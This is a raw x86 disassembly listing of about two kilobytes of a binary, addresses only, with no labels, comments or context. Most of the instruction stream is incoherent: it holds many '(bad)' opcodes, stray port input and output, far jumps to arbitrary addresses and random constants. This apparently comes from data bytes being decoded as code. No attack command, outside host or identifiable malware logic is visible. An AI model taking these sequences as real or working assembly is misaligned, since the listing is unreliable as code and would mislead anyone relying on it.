  4078fc:	adc    DWORD PTR [eax+ebx*1],ecx
  4078ff:	shr    eax,cl
  407901:	inc    edx
  407902:	sbb    al,0xd0
  407904:	mov    edi,0x8535cec4
  407909:	jae    0x4078d1
  40790b:	sub    eax,0xa4543f2
  407910:	add    BYTE PTR [ecx],al
  407912:	push   es
  407913:	in     al,dx
  407914:	inc    eax
  407915:	jmp    0x9908ae9c
  40791a:	repz sub al,0x50
  40791d:	mov    ecx,0x4107a6f3
  407922:	dec    edi
  407923:	dec    DWORD PTR cs:[esi+0x5a]
  407927:	push   esi
  407928:	lods   eax,DWORD PTR ds:[esi]
  407929:	inc    esi
  40792a:	repz mov ecx,0x62205119
  407930:	push   DWORD PTR [esi]
  407932:	daa    
  407933:	push   esp
  407934:	je     0x40793a
  407936:	popf   
  407937:	dec    esi
  407938:	cmp    BYTE PTR [eax+0x4ae7c432],ch
  40793e:	in     eax,0x2c
  407940:	inc    DWORD PTR [ecx-0x16bf13f9]
  407946:	bound  esi,QWORD PTR ds:0x2cf33898
  40794c:	push   eax
  40794d:	cdq    
  40794e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407950:	pop    es
  407951:	add    DWORD PTR [edi+0xeeff2d],edi
  407957:	add    BYTE PTR [ebx-0x7a],bl
  40795a:	lods   eax,DWORD PTR ds:[esi]
  40795b:	out    0x70,al
  40795d:	mov    edx,0x6393d11b
  407962:	call   esi
  407964:	and    al,0x54
  407966:	je     0x40796c
  407968:	fisttp QWORD PTR [ebp+0x38]
  40796b:	sub    BYTE PTR ds:0x823ae7c4,ch
  407971:	sub    eax,0xec4441ff
  407976:	inc    eax
  407977:	jmp    0x58a8ae7e
  40797c:	jo     0x4079ab
  40797e:	push   eax
  40797f:	cmp    DWORD PTR [eax-0x59],esi
  407982:	pop    es
  407983:	sub    DWORD PTR [ebp+ebp*1-0x49e27101],0xd2af00ac
  40798e:	imul   esp,DWORD PTR [ebx],0xffb0a1a0
  407994:	aas    
  407995:	pop    ds
  407996:	shl    BYTE PTR [ebp+esi*2+0x78],0xde
  40799b:	cmp    cl,bl
  40799d:	adc    BYTE PTR [eax-0x18],dl
  4079a0:	retf   
  4079a1:	mov    eax,ds:0xff70fffe
  4079a6:	aaa    
  4079a7:	inc    ecx
  4079a8:	cwde   
  4079a9:	inc    eax
  4079aa:	out    0x38,eax
  4079ac:	or     ebx,edx
  4079ae:	(bad)  
  4079af:	push   eax
  4079b0:	cwde   
  4079b1:	shl    DWORD PTR [eax+ecx*1-0x10],cl
  4079b5:	inc    esi
  4079b6:	std    
  4079b7:	call   FWORD PTR [edi]
  4079b9:	add    BYTE PTR [esi],dh
  4079bb:	lods   eax,DWORD PTR ds:[esi]
  4079bc:	add    BYTE PTR [eax],al
  4079be:	psrlq  mm7,mm6
  4079c1:	jne    0x4079ff
  4079c3:	shl    DWORD PTR [eax+ecx*1+0x30],cl
  4079c7:	mov    ecx,0xd93fffa9
  4079cc:	rol    DWORD PTR [eax+ebx*2],0x45
  4079d0:	mov    ch,ah
  4079d2:	leave  
  4079d3:	fcmovnu st,st(3)
  4079d5:	idiv   DWORD PTR [edi]
  4079d7:	ror    DWORD PTR [ebp+eax*2+0x75fe481c],cl
  4079de:	sub    ch,dl
  4079e0:	je     0x4079ee
  4079e2:	add    BYTE PTR [ebp+0x7e],ah
  4079e5:	add    BYTE PTR [eax],cl
  4079e7:	sbb    eax,eax
  4079e9:	setne  BYTE PTR [ebp-0x22e7ffff]
  4079f0:	inc    esp
  4079f1:	clc    
  4079f2:	or     BYTE PTR [eax],bl
  4079f4:	add    BYTE PTR [eax],al
  4079f6:	(bad)  
  4079f7:	push   edx
  4079f8:	repz call edi
  4079fb:	pop    ss
  4079fc:	add    BYTE PTR [edx-0x28],ch
  4079ff:	jns    0x407a00
  407a01:	imul   ecx,eax,0x318cff79
  407a07:	clc    
  407a08:	aaa    
  407a09:	push   eax
  407a0a:	mov    esp,0xc6f736b0
  407a0f:	xchg   edx,eax
  407a10:	sar    esi,cl
  407a12:	inc    esp
  407a13:	xchg   ebp,eax
  407a14:	inc    eax
  407a15:	jne    0x4079cc
  407a17:	xchg   ebp,eax
  407a18:	ret    0x317e
  407a1b:	cmp    eax,0x381dc00c
  407a20:	sub    al,BYTE PTR [ecx+0x3d300000]
  407a26:	add    ebp,DWORD PTR [eax+0x64]
  407a29:	adc    eax,0x408fffc3
  407a2e:	adc    ebp,eax
  407a30:	or     eax,0xe1ff3fad
  407a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a36:	push   edx
  407a37:	lea    ebp,[ecx+ebp*8-0x729100c9]
  407a3e:	aad    0xe7
  407a40:	std    
  407a41:	int3   
  407a42:	aas    
  407a43:	jmp    FWORD PTR [eax+0x56f732b0]
  407a49:	add    ch,BYTE PTR [ebx]
  407a4b:	stos   BYTE PTR es:[edi],al
  407a4c:	popf   
  407a4d:	sbb    al,BYTE PTR [eax+0x6a]
  407a50:	xor    DWORD PTR [ebp+0x3cf038ff],eax
  407a56:	inc    eax
  407a57:	mov    ch,0x41
  407a59:	sub    bh,BYTE PTR [edi]
  407a5b:	jmp    FWORD PTR [esi]
  407a5d:	mov    al,ds:0x81d4e80e
  407a62:	aas    
  407a63:	jmp    FWORD PTR [eax+0x16f727af]
  407a69:	inc    edx
  407a6a:	stos   BYTE PTR es:[edi],al
  407a6b:	call   DWORD PTR [esi+0x3140fcf0]
  407a71:	push   edx
  407a72:	jns    0x407a64
  407a74:	push   es
  407a75:	push   0x3f
  407a77:	(bad)  
  407a78:	jl     0x407aab
  407a7a:	sub    edx,DWORD PTR [edx-0x76c08662]
  407a80:	lods   al,BYTE PTR ds:[esi]
  407a81:	adc    ecx,DWORD PTR [ecx+0x132ade37]
  407a87:	add    al,0x0
  407a89:	add    BYTE PTR [ecx-0x8],cl
  407a8c:	iret   
  407a8d:	(bad)  
  407a8e:	into   
  407a8f:	sub    DWORD PTR [esp+esi*1-0x42],edx
  407a93:	sub    al,BYTE PTR [esi-0x6ee7bbc1]
  407a99:	mov    bh,0x87
  407a9b:	sub    dh,BYTE PTR [esi-0x73]
  407a9e:	mov    ah,0x37
  407aa0:	jbe    0x407ae1
  407aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aa3:	mov    ebp,0xed63abe8
  407aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa9:	add    edx,DWORD PTR [esi-0x71c8a6a0]
  407aaf:	sub    cl,BYTE PTR [esi-0x47]
  407ab2:	cmp    bh,BYTE PTR [eiz*4+0x702a7e6e]
  407ab9:	mov    DWORD PTR [ecx-0x24c0c9de],ecx
  407abf:	adc    eax,ecx
  407ac1:	into   
  407ac2:	sub    ebp,edx
  407ac4:	call   0x16641f07
  407ac9:	aas    
  407aca:	push   esi
  407acb:	sub    bl,BYTE PTR [edi+ecx*1+0x3f3dd459]
  407ad2:	inc    esi
  407ad3:	pushf  
  407ad4:	ins    BYTE PTR es:[edi],dx
  407ad5:	pusha  
  407ad6:	inc    esi
  407ad7:	sub    bh,dh
  407ad9:	xor    BYTE PTR [edi+ebp*1-0x2],0x3e
  407ade:	cs adc eax,0x67b20c74
  407ae4:	leave  
  407ae5:	ss push ds
  407ae7:	sub    ch,cl
  407ae9:	mov    bh,0x8d
  407aeb:	xchg   ebp,eax
  407aec:	xchg   esp,eax
  407aed:	das    
  407aee:	add    BYTE PTR [eax],al
  407af0:	push   es
  407af1:	sub    cl,dh
  407af3:	add    edi,DWORD PTR [ebp-0x38]
  407af6:	imul   eax,DWORD PTR [eax+0x3ebe2209],0x19ffa031
  407b00:	popf   
  407b01:	sub    edi,edi
  407b03:	mov    esi,0xf1752964
  407b08:	or     ch,BYTE PTR [ebp+0x29179ea7]
  407b0e:	mov    ch,0x85
  407b10:	pop    es
  407b11:	sub    edi,edi
  407b13:	mov    cs,WORD PTR [ecx+0x4ab6e811]
  407b19:	sub    edi,edi
  407b1b:	jle    0x407b56
  407b1d:	cmp    al,0xf7
  407b1f:	jbe    0x407b90
  407b21:	sub    DWORD PTR [ebp-0x1f],esi
  407b24:	pop    edx
  407b25:	push   ebx
  407b26:	test   al,0x66
  407b28:	pop    edi
  407b29:	sub    DWORD PTR [ebp-0xd6a0bb],esi
  407b2f:	push   esi
  407b30:	leave  
  407b31:	adc    eax,ebp
  407b33:	call   0x33f9:0x46ff291a
  407b3a:	idiv   DWORD PTR [esi]
  407b3c:	aaa    
  407b3d:	sub    DWORD PTR [ebp-0x1f],esi
  407b40:	sbb    ch,BYTE PTR [edi-0x58]
  407b43:	cs daa 
  407b45:	sub    DWORD PTR [ebp-0xd6d8bb],esi
  407b4b:	push   ds
  407b4c:	cdq    
  407b4d:	adc    eax,ebp
  407b4f:	jle    0x407b2b
  407b51:	sub    bh,bh
  407b53:	push   cs
  407b54:	add    BYTE PTR [eax],al
  407b56:	leave  
  407b57:	das    
  407b58:	test   DWORD PTR [esi],0x52a13bff
  407b5e:	imul   DWORD PTR [eax]
  407b60:	(bad)  
  407b61:	cmp    al,0x52
  407b63:	and    edi,edi
  407b65:	out    dx,al
  407b66:	pop    ebx
  407b67:	sub    BYTE PTR [ebx-0x4ad6a31a],0xcd
  407b6e:	pop    esp
  407b6f:	sub    edi,edi
  407b71:	sar    DWORD PTR [eax+0x44ceff7c],0x5f
  407b78:	call   0xff273a7d
  407b7d:	call   0x3f370a
  407b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b83:	mov    al,ds:0xe697f7db
  407b88:	out    0x75,eax
  407b8a:	and    edi,0xfffffffe
  407b8d:	(bad)  
  407b8e:	jge    0x407b70
  407b90:	idiv   bh
  407b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b93:	out    0x74,al
  407b95:	or     al,0xb7
  407b97:	pusha  
  407b98:	pop    es
  407b99:	call   0x3f6293
  407b9e:	aaa    
  407b9f:	mov    eax,ds:0xe727f7ef
  407ba4:	out    0x59,eax
  407ba6:	repz out 0xfe,al
  407ba9:	dec    ebp
  407bab:	in     al,dx
  407bac:	call   0xff277202
  407bb1:	jmp    FWORD PTR [ebp-0x18]
  407bb4:	out    0xa3,eax
  407bb6:	jne    0x407bcc
  407bb8:	add    cl,cl
  407bba:	add    BYTE PTR [eax],al
  407bbc:	dec    edx
  407bbd:	add    al,0x0
  407bbf:	push   ebp
  407bc0:	add    esp,esp
  407bc2:	add    ah,0x24
  407bc5:	jle    0x407bc6
  407bc7:	imul   edi,DWORD PTR [esi-0x19],0x7b400874
  407bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bcf:	push   DWORD PTR [edi]
  407bd1:	popf   
  407bd2:	inc    ebp
  407bd3:	cld    
  407bd4:	mov    al,0x4d
  407bd6:	cmp    BYTE PTR [ecx+0x58],al
  407bd9:	jl     0x407bdc
  407bdb:	add    BYTE PTR [eax-0x6c],cl
  407bde:	push   DWORD PTR [ebp+0x40]
  407be1:	cld    
  407be2:	idiv   ch
  407be4:	daa    
  407be5:	jmp    0x5321d551
  407bea:	(bad)  
  407beb:	(bad)  
  407bec:	cmp    eax,0x8412834
  407bf1:	jmp    0x5571846a
  407bf6:	daa    
  407bf7:	std    
  407bf8:	push   es
  407bf9:	push   edi
  407bfa:	cmp    al,0x75
  407bfc:	std    
  407bfd:	dec    esi
  407bfe:	mov    dh,0x7
  407c00:	or     eax,ebp
  407c02:	imul   edi,edi,0xffffffee
  407c05:	je     0x407c48
  407c07:	add    al,0x31
  407c09:	add    BYTE PTR [ecx+0x5f79b0ec],cl
  407c0f:	not    esi
  407c11:	xchg   BYTE PTR [esi+0x3cedcd45],cl
  407c17:	jne    0x407c3a
  407c19:	xchg   esi,eax
  407c1a:	mov    dh,0xb
  407c1c:	leave  
  407c1d:	stc    
  407c1e:	mov    esi,0xb60000ff
  407c23:	and    al,BYTE PTR [ebx+0xf]
  407c26:	mov    ah,0xdf
  407c28:	add    DWORD PTR [eax],eax
  407c2a:	xor    DWORD PTR [esi-0x3a],ebp
  407c2d:	div    DWORD PTR [ecx]
  407c2f:	cmp    eax,0x706e0003
  407c34:	aaa    
  407c35:	push   DWORD PTR [esi]
  407c37:	cmp    eax,0x53316a03
  407c3c:	add    ebp,DWORD PTR [edx+0x31]
  407c3f:	inc    ebx
  407c40:	add    ecx,DWORD PTR [ebp-0x732d1f14]
  407c46:	mov    ah,0xe9
  407c48:	xor    edi,edi
  407c4a:	lea    di,[esi*2-0x44a11a7]
  407c52:	dec    ecx
  407c53:	pop    ds
  407c54:	mov    esi,0x43324eff
  407c59:	je     0x407c87
  407c5b:	adc    al,0x82
  407c5d:	add    DWORD PTR [ecx],esi
  407c5f:	cmp    eax,0x7c09ccab
  407c64:	add    edi,edi
  407c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c67:	dec    ebp
  407c68:	sub    edi,DWORD PTR [ecx]
  407c6a:	xlat   BYTE PTR ds:[ebx]
  407c6b:	xor    eax,0x13aa503b
  407c70:	mov    ecx,0xd61fac89
  407c75:	cmp    ecx,DWORD PTR [esi]
  407c77:	les    edi,FWORD PTR [edx]
  407c79:	sub    al,0x58
  407c7b:	jbe    0x407c4b
  407c7d:	cmp    ebp,DWORD PTR [eax-0x9cc4670]
  407c83:	sar    DWORD PTR es:[ebx+0x26980000],1
  407c8a:	mov    dh,0xae
  407c8c:	out    0xae,al
  407c8e:	dec    esp
  407c8f:	std    
  407c90:	jno    0x407ca6
  407c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c93:	jno    0x407c76
  407c95:	push   ds
  407c96:	sahf   
  407c97:	cmp    ecx,esi
  407c99:	mov    al,ds:0x78b32be4
  407c9e:	mov    ?,WORD PTR [ebx]
  407ca0:	test   al,0x90
  407ca2:	lea    esi,[ebx]
  407ca4:	mov    dh,0x26
  407ca6:	adc    eax,DWORD PTR [ecx+ebx*1]
  407ca9:	jl     0x407c5b
  407cab:	les    esp,FWORD PTR [esi-0x59cbcbdb]
  407cb1:	cmp    bx,WORD PTR es:[eax+ebx*1]
  407cb6:	push   ecx
  407cb7:	mov    ds:0x8d5626dd,eax
  407cbc:	lods   al,BYTE PTR ds:[esi]
  407cbd:	xor    edx,DWORD PTR [esi+0x3b]
  407cc0:	jle    0x407c7b
  407cc2:	call   0xa82d2972
  407cc7:	add    ebp,DWORD PTR [esi+0x60]
  407cca:	cmp    DWORD PTR [ebx],esi
  407ccc:	data16 es cs mov cl,0x2a
  407cd1:	cmp    al,0xb5
  407cd3:	push   0x81702656
  407cd8:	pop    ebp
  407cd9:	push   ds
  407cda:	push   ss
  407cdb:	cmp    ebx,ebx
  407cdd:	adc    eax,DWORD PTR [ecx-0x172b076d]
  407ce3:	cmp    bh,BYTE PTR [ebx+eiz*1-0xa]
  407ce7:	cmp    ch,BYTE PTR [esi]
  407ce9:	add    BYTE PTR es:[eax+eax*1+0x0],bh
  407cee:	cs cmp al,0x31
  407cf1:	cmp    al,0x5a
  407cf3:	and    eax,0x1d4a6c89
  407cf8:	(bad)  
  407cf9:	(bad)  
  407cfb:	and    eax,0xd5059c67
  407d00:	dec    ebp
  407d02:	and    DWORD PTR [edi+esi*8],0x75253bc6
  407d09:	in     eax,dx
  407d0a:	sbb    bh,dh
  407d0c:	lods   al,BYTE PTR ds:[esi]
  407d0d:	mov    dh,0x2b
  407d0f:	fwait
  407d10:	test   DWORD PTR [ebp+0x6aff2523],ecx
  407d16:	pop    ecx
  407d17:	xor    bh,dh
  407d19:	sahf   
  407d1a:	or     edx,DWORD PTR [esi*2-0x1f985020]
  407d21:	xchg   esi,eax
  407d22:	sti    
  407d23:	and    al,0x0
  407d25:	std    
  407d26:	xchg   ecx,eax
  407d27:	xchg   edx,eax
  407d28:	mov    ebp,0xff25638d
  407d2d:	jmp    0x2cc34708
  407d32:	dec    edx
  407d33:	sbb    eax,0xa03266ff
  407d38:	push   edx
  407d39:	shl    DWORD PTR [edx],1
  407d3b:	adc    al,0xef
  407d3d:	xchg   edi,eax
  407d3e:	dec    ebx
  407d3f:	lahf   
  407d40:	pop    es
  407d41:	inc    ecx
  407d42:	bound  ebp,QWORD PTR [edi-0x1]
  407d45:	inc    esi
  407d46:	cmp    ebx,DWORD PTR [edi-0x14]
  407d49:	sub    esp,DWORD PTR ss:0x3c3abcff
  407d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d51:	xchg   DWORD PTR [eax],eax
  407d53:	add    BYTE PTR [ebx],bl
  407d55:	and    eax,0x1d0a5cff
  407d5a:	call   FWORD PTR [esi]
  407d5c:	or     ebx,DWORD PTR [edi+0x6ea00107]
  407d62:	dec    DWORD PTR [esi]
  407d64:	sti    
  407d65:	pop    esi
  407d66:	in     al,0x0
  407d68:	aaa    
  407d69:	jmp    0x407d69
  407d6b:	jmp    DWORD PTR [ebp+0x7688e819]
  407d71:	jmp    0xfff6:0xf165fffe
  407d78:	por    mm6,QWORD PTR [eax+ecx*1-0x20]
  407d7d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  407d7f:	(bad)  
  407d80:	fucomip st,st(2)
  407d82:	mov    ah,0xdc
  407d84:	out    0xea,eax
  407d86:	(bad)  
  407d87:	push   DWORD PTR ds:0xb66ce818
  407d8d:	jmp    0xfff6:0xf465fffe
  407d94:	(bad)  
  407d95:	div    DWORD PTR [ebp-0x57]
  407d98:	(bad)  
  407d9c:	mov    eax,0xb0fffee2
  407da1:	jbe    0x407d4b
  407da3:	jmp    FWORD PTR [edi+0x37ecb4ea]
  407da9:	jmp    0x407da9
  407dab:	call   0x3f36e8
  407db0:	pop    ds
  407db1:	mov    ch,0xe7
  407db3:	test   DWORD PTR [edi],0x55e7eb
  407db9:	add    cl,al
  407dbb:	jmp    0xfff6:0xcba5fffe
  407dc2:	fcomip st,st(7)
  407dc4:	dec    ecx
  407dc5:	test   eax,0xb5feeaef
  407dca:	cmp    bl,ah
  407dcc:	(bad)  
  407dcd:	jmp    FWORD PTR [edi]
  407dcf:	jne    0x407ddc
  407dd1:	jmp    DWORD PTR [ebp+0xe3de818]
  407dd7:	jmp    0x407dd7
  407dd9:	push   ebp
  407ddb:	fcomip st,st(6)
  407ddd:	jmp    FWORD PTR [edi]
  407ddf:	clc    
  407de0:	sub    eax,0x38fe31a9
  407de5:	push   esp
  407de7:	add    ch,BYTE PTR [ebx]
  407de9:	push   ecx
  407dea:	aaa    
  407deb:	or     eax,0x21a4ff39
  407df0:	sub    edi,DWORD PTR [eax-0x56]
  407df3:	sub    eax,0x41f3c903
  407df8:	add    edx,DWORD PTR [ebp-0x56]
  407dfb:	dec    ecx
  407dfc:	test   ah,al
  407dfe:	or     eax,0x1e6a03c8
  407e03:	dec    edx
  407e04:	scas   al,BYTE PTR es:[edi]
  407e05:	pop    es
  407e06:	or     esi,ebp
  407e08:	popa   
  407e09:	push   esi
  407e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e0c:	mov    ebp,0xfa6f59fb
  407e11:	inc    eax
  407e12:	xor    DWORD PTR [edx-0x12],ebp
  407e15:	pop    ebx
  407e16:	or     ah,ch
  407e18:	add    edi,edi
  407e1a:	pop    esp
  407e1b:	and    eax,0xf62b
  407e20:	int3   
  407e21:	cmp    BYTE PTR [eax],0x68
  407e24:	repz inc esp
  407e26:	ret    0x56ff
  407e29:	das    
  407e2a:	add    eax,DWORD PTR [eax]
  407e2c:	mov    cl,0x9a
  407e2e:	scas   al,BYTE PTR es:[edi]
  407e2f:	pop    es
  407e30:	cdq    
  407e31:	cdq    
  407e32:	jmp    DWORD PTR ss:[esi-0x61045256]
  407e39:	sub    BYTE PTR [ebx],cl
  407e3b:	call   0xff791142
  407e40:	js     0x407e31
  407e42:	(bad)  
  407e43:	(bad)  
  407e44:	fnsave [ebp-0x1e8a7eda]
  407e4a:	das    
  407e4b:	push   DWORD PTR [esi-0x58]
  407e4e:	mov    ebp,0xade201fb
  407e53:	pcmpgtd mm4,QWORD PTR [eax+0x7]
  407e57:	call   0x43e494
  407e5c:	sub    dl,BYTE PTR [ecx+ebp*1]
  407e5f:	or     BYTE PTR [ebx+edx*4+0x5b3103e9],dh
  407e66:	lods   al,BYTE PTR ds:[esi]
  407e67:	cmp    esi,DWORD PTR [ecx]
  407e69:	adc    al,0xe9
  407e6b:	add    ebp,DWORD PTR [esi-0x27]
  407e6e:	cld    
  407e6f:	aaa    
  407e70:	ss adc al,0xe9
  407e73:	lods   eax,DWORD PTR ds:[esi]
  407e74:	lods   eax,DWORD PTR es:[esi]
  407e76:	call   0xe8ed9d28
  407e7b:	xchg   BYTE PTR [eax+ebp*1+0x39],ch
  407e7f:	mov    DWORD PTR [edi+eiz*1+0x37d6],esi
  407e86:	push   es
  407e87:	(bad)  
  407e88:	aad    0xb1
  407e8a:	push   es
  407e8b:	and    edx,DWORD PTR [eax+edi*1+0x9]
  407e8f:	and    DWORD PTR [ebx+0x4],eax
  407e92:	xor    DWORD PTR [edi],ecx
  407e94:	test   eax,0x1c2f30b0
  407e99:	mov    DWORD PTR [edi+ebp*1-0x3c29c84a],esi
  407ea0:	jae    0x407e23
  407ea2:	lds    ebp,FWORD PTR [edx]
  407ea4:	sahf   
  407ea5:	aaa    
  407ea6:	popa   
  407ea7:	and    ebx,DWORD PTR [esp+edx*1]
  407eaa:	mov    esi,0x372bdca8
  407eaf:	outs   dx,DWORD PTR ds:[esi]
  407eb0:	xchg   BYTE PTR [edi],dh
  407eb2:	mov    eax,0xa62f7998
  407eb7:	and    ah,dl
  407eb9:	inc    ebx
  407eba:	and    eax,0x857969f6
  407ebf:	sub    ah,BYTE PTR [esi+0x37]
  407ec2:	xor    DWORD PTR [eax+0x2286abff],ebp
  407ec8:	inc    esi
  407ec9:	jbe    0x407f49
  407ecb:	push   0x22762f3d
  407ed0:	inc    esi
  407ed1:	jno    0x407f34
  407ed3:	sub    bh,BYTE PTR [esi]
  407ed5:	aaa    
  407ed6:	data16 test al,0xff
  407ed9:	loopne 0x407ee5
  407edb:	push   ebx
  407edc:	leave  
  407edd:	cs push ds
  407edf:	and    esi,DWORD PTR [ebp-0xdce1e7]
  407ee5:	adc    DWORD PTR [esi+0x7a],ecx
  407ee8:	call   DWORD PTR [esi]
  407eea:	add    BYTE PTR [eax],al
  407eec:	push   es
  407eed:	fincstp 
  407eef:	add    ch,BYTE PTR [ebp+0x5d057522]
  407ef5:	mov    al,ds:0x4b32e979
  407efa:	ret    0x32e5
  407efd:	(bad)  
  407efe:	mov    bh,ch
  407f00:	mov    bl,0x58
  407f02:	cld    
  407f03:	push   ebx
  407f04:	xor    eax,0xc1de17ae
  407f09:	sbb    eax,ebp
  407f0b:	sub    eax,0x60ff2190
  407f10:	icebp  
  407f11:	sbb    eax,0xd4edce68
  407f16:	(bad)  
  407f17:	mov    ebp,0x2828bde1
  407f1c:	xor    eax,0xae17521
  407f21:	idiv   esi
  407f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f24:	pop    es
  407f25:	lods   al,BYTE PTR ds:[esi]
  407f26:	out    0xe0,al
  407f28:	in     eax,dx
  407f29:	and    DWORD PTR [edi-0x15],esp
  407f2c:	xor    dl,BYTE PTR [eax+eax*4]
  407f2f:	mov    es,WORD PTR [ecx+0x67dae819]
  407f35:	and    edi,edi
  407f37:	adc    DWORD PTR ds:0x67e940de,ebp
  407f3d:	out    0x5b,eax
  407f3f:	shr    BYTE PTR [ebp+0x21],0xfe
  407f43:	fdivr  QWORD PTR [edx]
  407f45:	sub    al,0x0
  407f47:	pop    esi
  407f48:	aas    
  407f49:	and    DWORD PTR [eax-0x17],ebp
  407f4c:	js     0x407f22
  407f4e:	inc    eax
  407f50:	add    BYTE PTR [eax],al
  407f52:	xor    BYTE PTR [eax+eax*1],dl
  407f55:	add    al,bl
  407f57:	jmp    0xf74087d0
  407f5c:	std    
  407f5d:	jmp    DWORD PTR [edi]
  407f5f:	jmp    0xe807:0x6407fc74
  407f66:	push   0xffffffb4
  407f68:	(bad)  
  407f69:	inc    DWORD PTR [ecx]
  407f6b:	rol    DWORD PTR [ebx],cl
  407f6d:	add    BYTE PTR [ebp-0x72],bh
  407f70:	in     al,dx
  407f71:	call   FWORD PTR [ebp-0x7c0b17e7]
  407f77:	jmp    0x6838:0x71580bfe
  407f7e:	cmc    
  407f7f:	sbb    al,BYTE PTR [eax+0x0]
  407f82:	mov    eax,0x17ab88ec
  407f87:	out    0x4f,eax
  407f89:	push   eax
  407f8a:	pusha  
  407f8b:	sbb    BYTE PTR [eax],al
  407f8d:	out    dx,eax
  407f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f8f:	outs   dx,DWORD PTR ds:[esi]
  407f90:	and    bh,BYTE PTR [edx]
  407f92:	dec    ecx
  407f93:	sbb    BYTE PTR [eax-0x1],dl
  407f96:	sub    eax,0x9450e810
  407f9b:	out    0xfe,al
  407f9d:	pop    eax
  407f9e:	jo     0x407fb5
  407fa0:	add    bh,ch
  407fa2:	inc    esi
  407fa3:	jo     0x407fcc
  407fa5:	cmp    bl,BYTE PTR [ecx]
  407fa7:	sbb    BYTE PTR [eax-0x1],dl
  407faa:	sbb    eax,0x943ce810
  407faf:	out    0xfe,al
  407fb1:	call   0x3f3ee6
  407fb6:	add    BYTE PTR [eax],al
  407fb8:	loope  0x407f8f
  407fba:	pop    es
  407fbb:	add    BYTE PTR ds:0xcc83ec8b,bh
  407fc1:	fld    TBYTE PTR [ecx+0x0]
  407fc4:	xor    bh,ch
  407fc6:	(bad)  
  407fc7:	jne    0x407f49
  407fc9:	in     al,dx
  407fca:	mov    DWORD PTR [edi+eiz*8+0x314588e6],esp
  407fd1:	(bad)  
  407fd2:	test   eax,0xb477619
  407fd7:	call   0xff7559a0
  407fdc:	fisttp DWORD PTR ds:0xd3297535
  407fe2:	mov    bh,bh
  407fe4:	push   esi
  407fe5:	icebp  
  407fe6:	test   eax,0xb7f4e1b
  407feb:	call   0xff7581a0
  407ff0:	ds jg  0x40802a
  407ff3:	(bad)  
  407ff4:	mov    esp,0xd5a42b32
  407ff9:	push   ss
  407ffa:	xor    eax,0x339f3c9
  407fff:	push   ebp
  408000:	stos   BYTE PTR es:[edi],al
  408001:	sbb    DWORD PTR [ecx-0x51d0ea3c],eax
  408007:	or     ebx,DWORD PTR [ecx]
  408009:	retf   
  40800a:	push   0x432306ff
  40800f:	lgs    ecx,FWORD PTR [edx-0x4bcefffd]
  408016:	mov    ebp,0x13d8b2fb
  40801b:	add    BYTE PTR [eax],al
  40801d:	add    BYTE PTR [ebp+0x2f],bl
  408020:	xor    al,0x75
  408022:	inc    ecx
  408023:	data16 scas al,BYTE PTR es:[edi]
  408025:	sti    
  408026:	leave  
  408027:	push   edx
  408028:	imul   edi,edi,0xfbbda4ce
  40802e:	pop    ecx
  40802f:	in     eax,0xf9
  408031:	inc    eax
  408032:	xor    DWORD PTR [esi-0x49360452],eax
  408038:	push   0xabfdaeff
  40803d:	jmp    DWORD PTR [esi-0x61af8a72]
  408043:	and    BYTE PTR [ebx],cl
  408045:	call   0xff74f5bc
  40804a:	cdq    
  40804b:	adc    al,0x3d
  40804d:	pop    ebp
  40804e:	xchg   BYTE PTR [edi],bl
  408050:	shr    DWORD PTR [ebp+0x34e8d538],1
  408056:	cld    
  408057:	pop    ds
  408058:	inc    ecx
  408059:	popf   
  40805a:	cwde   
  40805b:	pop    ds
  40805c:	inc    esi
  40805d:	ror    esi,cl
  40805f:	adc    al,0xe9
  408061:	and    al,0x9f
  408063:	les    esi,FWORD PTR ds:0x8b2c2eae
  408069:	dec    ebx
  40806a:	dec    esi
  40806b:	pop    ds
  40806c:	adc    DWORD PTR [eax-0x71],esi
  40806f:	pop    ds
  408070:	push   ds
  408071:	stos   DWORD PTR es:[edi],eax
  408072:	fcmovu st,st(1)
  408074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408075:	add    esi,DWORD PTR [esi]
  408077:	test   eax,0x6a742b0c
  40807c:	push   es
  40807d:	xor    al,0x81
  40807f:	lods   al,BYTE PTR ds:[esi]
  408080:	call   0xe408088
  408085:	pop    esi
  408086:	cdq    
  408087:	xor    al,0x9c
  408089:	or     al,0x1
  40808b:	cmp    cl,0x1e
  40808e:	out    0x1c,al
  408090:	mov    ds:0x8933de75,eax
  408095:	xchg   ecx,eax
  408096:	adc    eax,ebp
  408098:	neg    BYTE PTR ds:0xf7d93054
  40809e:	xchg   edx,eax
  40809f:	xor    esp,esi
  4080a1:	ret    
  4080a2:	push   eax
  4080a3:	add    eax,0xd4772f31
  4080a8:	xlat   BYTE PTR ds:[ebx]
  4080a9:	test   al,0xe0
  4080ab:	sbb    edx,DWORD PTR [ecx+0x4c]
  4080ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080af:	xor    ebx,ecx
  4080b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b2:	inc    esi
  4080b3:	xor    edi,DWORD PTR [esi-0x36cfe3e2]
  4080b9:	lods   al,BYTE PTR ds:[esi]
  4080ba:	inc    esi
  4080bb:	xor    ebp,DWORD PTR [esi+0x3100ab4c]
  4080c1:	leave  
  4080c2:	jno    0x4080e4
  4080c4:	mov    dl,0x57
  4080c6:	add    BYTE PTR [ebp-0x49],dh
  4080c9:	push   ds
  4080ca:	imul   edx,ebx,0x5107a943
  4080d0:	push   es
  4080d1:	jae    0x4080d2
  4080d3:	pop    esi
  4080d4:	cld    
  4080d5:	fdivr  st,st(3)
  4080d7:	ret    
  4080d8:	xor    ch,BYTE PTR [edx+0x16a84e19]
  4080de:	call   0xff5fa2ee
  4080e3:	shl    DWORD PTR [edx],cl
